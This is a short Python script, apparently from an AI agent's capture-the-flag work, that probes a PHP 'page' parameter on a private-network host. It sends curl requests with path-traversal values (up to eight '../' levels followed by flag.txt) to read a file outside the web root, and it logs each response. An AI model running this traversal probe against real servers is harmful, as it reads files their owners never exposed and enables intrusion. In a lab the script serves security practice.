import json
from urllib.parse import urlencode

from framework_evidence import run_tool

BASE = "http://192.168.2.0/index.php"
# Exercise only the observed page-selection interface and values targeting
# the root-level flag file. Traversal depths are tested separately because
# the application's include location is not established by prior evidence.
page_values = ["flag.txt", "/flag.txt"] + ["../" * depth + "flag.txt" for depth in range(1, 9)]
results = []

for page_value in page_values:
    url = BASE + "?" + urlencode({"page": page_value})
    argv = ["curl", "-sS", "-i", "--max-time", "20", url]
    try:
        envelope = run_tool(argv)
        results.append({
            "page_value": page_value,
            "requested_url": url,
            "envelope": envelope,
        })
    except Exception as exc:
        results.append({
            "page_value": page_value,
            "requested_url": url,
            "error": "%s: %s" % (type(exc).__name__, exc),
        })

print(json.dumps({
    "purpose": "Targeted test of the observed PHP page-selection interface for root-level flag.txt; each tool envelope is retained.",
    "target": BASE,
    "results": results,
}, ensure_ascii=False))

